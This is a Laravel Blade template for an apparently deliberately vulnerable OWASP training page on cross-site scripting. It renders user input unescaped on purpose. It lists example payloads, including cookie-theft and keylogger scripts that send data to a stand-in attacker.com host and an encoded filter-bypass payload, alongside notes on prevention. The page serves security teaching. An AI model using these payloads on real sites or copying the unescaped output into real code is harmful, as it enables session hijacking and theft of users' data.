@extends('layouts.app')

@section('content')
<div class="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black py-12">
    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
        
        <!-- Header -->
        <div class="text-center mb-8">
            <h1 class="text-4xl font-bold text-purple-400 mb-2">{{ $vulnerability }}</h1>
            <p class="text-gray-300 text-lg">{{ $description }}</p>
            <div class="mt-4 inline-block bg-purple-600/20 text-purple-300 px-4 py-2 rounded-lg">
                ⚡ <strong>Risk Level: CRITICAL</strong> - Account takeover possible
            </div>
        </div>

        <!-- Navigation -->
        <div class="mb-8 text-center">
            <a href="{{ route('owasp.dashboard') }}" 
               class="inline-block bg-gray-700 hover:bg-gray-600 text-white px-6 py-2 rounded-lg transition">
                ← Back to OWASP Dashboard
            </a>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
            
            <!-- XSS Testing Form -->
            <div class="bg-black/60 backdrop-blur-lg rounded-2xl p-6 border border-purple-500/30">
                <h2 class="text-2xl font-bold text-purple-400 mb-4">⚡ XSS Vulnerability Testing</h2>
                
                <form method="GET" action="{{ route('owasp.bonus.xss') }}" class="space-y-4">
                    <div>
                        <label class="block text-gray-300 text-sm font-semibold mb-2">
                            User Input (Reflected XSS)
                        </label>
                        <input type="text" 
                               name="input" 
                               value="{{ $userInput }}"
                               placeholder="Try: <script>alert('XSS')</script>" 
                               class="w-full bg-gray-800 text-white border border-gray-600 rounded-lg px-4 py-2 focus:border-purple-500 focus:outline-none">
                    </div>
                    <button type="submit" 
                            class="w-full bg-purple-600 hover:bg-purple-500 text-white font-semibold py-2 px-4 rounded-lg transition">
                        ⚡ Test XSS Payload
                    </button>
                </form>

                @if($userInput)
                <div class="mt-6 bg-gray-800/50 p-4 rounded-lg">
                    <h3 class="text-purple-400 font-semibold mb-2">🔍 User Input (Unescaped):</h3>
                    <div class="bg-red-900/30 p-3 rounded border border-red-500/50">
                        <p class="text-red-300 text-sm">Vulnerable Output:</p>
                        <!-- VULNERABLE: Unescaped output -->
                        <div class="text-white mt-2">{!! $userInput !!}</div>
                    </div>
                </div>

                <div class="mt-4 bg-gray-800/50 p-4 rounded-lg">
                    <h3 class="text-green-400 font-semibold mb-2">✅ Secure Output (Escaped):</h3>
                    <div class="bg-green-900/30 p-3 rounded border border-green-500/50">
                        <p class="text-green-300 text-sm">Safe Output:</p>
                        <div class="text-white mt-2">{{ $userInput }}</div>
                    </div>
                </div>
                @endif
            </div>

            <!-- XSS Payloads -->
            <div class="bg-black/60 backdrop-blur-lg rounded-2xl p-6 border border-purple-500/30">
                <h2 class="text-2xl font-bold text-purple-400 mb-4">💉 XSS Payload Examples</h2>
                
                <div class="space-y-4">
                    <div class="bg-gray-800/50 p-4 rounded-lg">
                        <h4 class="text-yellow-400 font-semibold mb-2">1. Basic Alert</h4>
                        <code class="text-purple-300 text-sm bg-black/50 px-2 py-1 rounded block break-all">
                            &lt;script&gt;alert('XSS')&lt;/script&gt;
                        </code>
                        <p class="text-gray-400 text-xs mt-2">Simple popup to confirm XSS vulnerability</p>
                    </div>

                    <div class="bg-gray-800/50 p-4 rounded-lg">
                        <h4 class="text-yellow-400 font-semibold mb-2">2. Cookie Theft</h4>
                        <code class="text-purple-300 text-sm bg-black/50 px-2 py-1 rounded block break-all">
                            &lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;
                        </code>
                        <p class="text-gray-400 text-xs mt-2">Steals session cookies and sends to attacker</p>
                    </div>

                    <div class="bg-gray-800/50 p-4 rounded-lg">
                        <h4 class="text-yellow-400 font-semibold mb-2">3. Keylogger</h4>
                        <code class="text-purple-300 text-sm bg-black/50 px-2 py-1 rounded block break-all">
                            &lt;script&gt;document.addEventListener('keypress', function(e) { new Image().src = 'http://attacker.com/log.php?key=' + e.key; });&lt;/script&gt;
                        </code>
                        <p class="text-gray-400 text-xs mt-2">Logs every keystroke to attacker's server</p>
                    </div>

                    <div class="bg-gray-800/50 p-4 rounded-lg">
                        <h4 class="text-yellow-400 font-semibold mb-2">4. DOM Manipulation</h4>
                        <code class="text-purple-300 text-sm bg-black/50 px-2 py-1 rounded block break-all">
                            &lt;script&gt;document.body.innerHTML = '&lt;h1&gt;Site Hacked!&lt;/h1&gt;'&lt;/script&gt;
                        </code>
                        <p class="text-gray-400 text-xs mt-2">Replaces entire page content</p>
                    </div>

                    <div class="bg-gray-800/50 p-4 rounded-lg">
                        <h4 class="text-yellow-400 font-semibold mb-2">5. Event Handler</h4>
                        <code class="text-purple-300 text-sm bg-black/50 px-2 py-1 rounded block break-all">
                            &lt;img src="x" onerror="alert('XSS')"&gt;
                        </code>
                        <p class="text-gray-400 text-xs mt-2">XSS through image error event</p>
                    </div>

                    <div class="bg-gray-800/50 p-4 rounded-lg">
                        <h4 class="text-red-400 font-semibold mb-2">6. Advanced Payload</h4>
                        <code class="text-red-300 text-sm bg-red-900/30 px-2 py-1 rounded block break-all">
                            &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;
                        </code>
                        <p class="text-red-400 text-xs mt-2">Encoded payload to bypass basic filters</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Stored XSS Demo -->
        <div class="mt-8 bg-black/60 backdrop-blur-lg rounded-2xl p-6 border border-orange-500/30">
            <h2 class="text-2xl font-bold text-orange-400 mb-4">💾 Stored XSS Simulation</h2>
            
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div>
                    <h3 class="text-lg font-semibold text-orange-300 mb-3">Add Comment (Vulnerable)</h3>
                    <form method="POST" action="{{ route('owasp.bonus.comment') }}" class="space-y-4">
                        @csrf
                        <input type="hidden" name="post_id" value="1">
                        <div>
                            <label class="block text-gray-300 text-sm font-semibold mb-2">
                                Comment Content
                            </label>
                            <textarea name="content" 
                                      rows="4"
                                      placeholder="Try: <script>alert('Stored XSS!')</script>"
                                      class="w-full bg-gray-800 text-white border border-gray-600 rounded-lg px-4 py-2 focus:border-orange-500 focus:outline-none"></textarea>
                        </div>
                        <button type="submit" 
                                class="w-full bg-orange-600 hover:bg-orange-500 text-white font-semibold py-2 px-4 rounded-lg transition">
                            💾 Submit Comment (Stored XSS)
                        </button>
                    </form>
                </div>
                
                <div>
                    <h3 class="text-lg font-semibold text-orange-300 mb-3">⚠️ Stored XSS Warning</h3>
                    <div class="bg-red-900/30 p-4 rounded-lg border border-red-500/50">
                        <p class="text-red-300 text-sm mb-3">
                            <strong>Stored XSS</strong> is more dangerous than reflected XSS because:
                        </p>
                        <ul class="text-red-300 text-sm space-y-1">
                            <li>• Payload is permanently stored in database</li>
                            <li>• Affects all users who view the content</li>
                            <li>• No user interaction required to trigger</li>
                            <li>• Persistent attack vector</li>
                            <li>• Can spread like a worm</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- Educational Content -->
        <div class="mt-8 bg-black/60 backdrop-blur-lg rounded-2xl p-6 border border-green-500/30">
            <h2 class="text-2xl font-bold text-green-400 mb-4">🎓 Educational Content</h2>
            
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div>
                    <h3 class="text-lg font-semibold text-red-400 mb-3">🚨 XSS Types</h3>
                    <ul class="text-gray-300 space-y-2 text-sm">
                        <li>• <strong>Reflected XSS:</strong> Payload in URL/form, immediately reflected</li>
                        <li>• <strong>Stored XSS:</strong> Payload stored in database, executed later</li>
                        <li>• <strong>DOM XSS:</strong> Client-side script modification</li>
                        <li>• <strong>Blind XSS:</strong> Payload executed in admin panel/backend</li>
                    </ul>
                </div>
                
                <div>
                    <h3 class="text-lg font-semibold text-yellow-400 mb-3">💥 Attack Impact</h3>
                    <ul class="text-gray-300 space-y-2 text-sm">
                        <li>• <strong>Session Hijacking:</strong> Steal authentication cookies</li>
                        <li>• <strong>Account Takeover:</strong> Perform actions as victim</li>
                        <li>• <strong>Data Theft:</strong> Access sensitive information</li>
                        <li>• <strong>Phishing:</strong> Modify page content to steal credentials</li>
                    </ul>
                </div>
                
                <div>
                    <h3 class="text-lg font-semibold text-green-400 mb-3">🛡️ Prevention</h3>
                    <ul class="text-gray-300 space-y-2 text-sm">
                        <li>• <strong>Output Encoding:</strong> Escape all user data</li>
                        <li>• <strong>Input Validation:</strong> Whitelist allowed characters</li>
                        <li>• <strong>CSP Headers:</strong> Content Security Policy</li>
                        <li>• <strong>HttpOnly Cookies:</strong> Prevent JS access</li>
                    </ul>
                </div>
            </div>

            <div class="mt-6 bg-gray-800/50 p-4 rounded-lg">
                <h4 class="text-blue-400 font-semibold mb-2">🔧 Laravel XSS Prevention:</h4>
                <pre class="text-green-300 text-sm overflow-x-auto"><code>// SECURE: Blade automatic escaping
{{ $userInput }}  // Escaped output

// VULNERABLE: Raw output
{!! $userInput !!}  // Unescaped - DANGEROUS!

// SECURE: Manual escaping
{{ htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8') }}</code></pre>
            </div>
        </div>

    </div>
</div>
@endsection
